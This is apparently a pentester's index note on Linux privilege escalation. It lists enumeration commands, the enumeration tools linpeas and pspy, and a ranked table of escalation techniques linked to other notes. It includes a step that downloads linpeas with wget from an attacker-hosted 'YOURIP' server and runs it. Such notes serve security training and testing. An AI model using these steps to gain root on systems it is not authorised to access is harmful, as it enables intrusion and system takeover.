# 🐧 Linux Privilege Escalation (Hub)

> You have a low-priv Linux shell (`www-data`, a user). Goal: **root**. This is the index — run the quick checks below, then jump to the per-technique note for whatever looks promising. Upgrade to a TTY first ([[Shells]]).

Related: [[Shells]] · [[Credential Attacks]] · [[Pivoting and Port Forwarding]]

---

## ⚡ FIRST 5 COMMANDS (fast wins)
```bash
id ; whoami ; hostname
```
```bash
sudo -l
```
```bash
uname -a ; cat /etc/os-release
```
```bash
find / -perm -4000 -type f 2>/dev/null
```
```bash
cat /etc/crontab ; ls -la /etc/cron.*
```
Then drop and run an automated enumerator while you read the output.

## 🤖 AUTOMATED ENUM
```bash
./linpeas.sh | tee linpeas.txt          # the big one
```
```bash
./pspy64                                 # watch cron/processes live (no root needed)
```
Also: `lse.sh -l1`, `linenum.sh`. Transfer with `wget http://YOURIP/linpeas.sh` (start `python3 -m http.server 80` on Kali) — see [[File Transfer Cheat Sheet]].

---

## 🎯 TECHNIQUES (priority order — click into each)
| # | Technique | Note | Prob |
|---|---|---|---|
| 1 | Misconfigured sudo → GTFOBins / LD_PRELOAD / sudo CVEs | [[Sudo Abuse]] | 🟢 |
| 2 | SUID/SGID → GTFOBins / PATH hijack / injection | [[SUID & SGID]] | 🟢 |
| 3 | Cron: writable script / relative PATH / wildcard | [[Cron Jobs]] | 🟢 |
| 4 | `pkexec` PwnKit + kernel CVEs | [[Linux Kernel Exploits]] | 🟢 (PwnKit) |
| 5 | Credentials & keys on disk → reuse/`su` | [[Linux Credential Hunting]] | 🟢 |
| 6 | Capabilities (`cap_setuid`, file R/W caps) | [[Linux Capabilities]] | 🟡 |
| 7 | Writable `/etc/passwd`/service + PATH hijack | [[Writable Files & PATH Hijack]] | 🟡 |
| 8 | `docker`/`lxd` group → mount host `/` | [[Docker & LXD Privesc]] | 🟢 (if in group) |
| — | NFS `no_root_squash` (remote SUID drop) | [[NFS]] | 🔵 |

## 🔁 FOUND → NEXT (router)
| FINDING | GO |
|---|---|
| `sudo -l` allows a binary | [[Sudo Abuse]] |
| Non-standard SUID | [[SUID & SGID]] |
| Root cron + writable script | [[Cron Jobs]] |
| `pkexec` present / old kernel | [[Linux Kernel Exploits]] |
| Password/key on disk | [[Linux Credential Hunting]] |
| `getcap` shows `cap_setuid` | [[Linux Capabilities]] |
| Writable `/etc/passwd` or service | [[Writable Files & PATH Hijack]] |
| `id` shows docker/lxd | [[Docker & LXD Privesc]] |

## 🚧 STUCK?
Re-read linpeas fully; run `pspy` for hidden cron; check **other users'** files (`/home/*`, `/opt`, `/var/www`); try `pkexec`/PwnKit; hunt creds harder. Then → [[Stuck — What Now]].

## ⚠️ COMMON MISTAKES
- Not running `sudo -l` first · ignoring `pkexec`/PwnKit · missing cron (didn't run `pspy`) · only checking your own home · jumping to kernel exploits before config wins · not upgrading to a TTY.

## 📇 QUICK ORDER
`sudo -l` → SUID (GTFOBins) → cron (pspy) → PwnKit → creds → caps → writable files → docker/lxd → NFS → kernel.
See [[Privilege Escalation Cheat Sheet]] for the condensed command list.
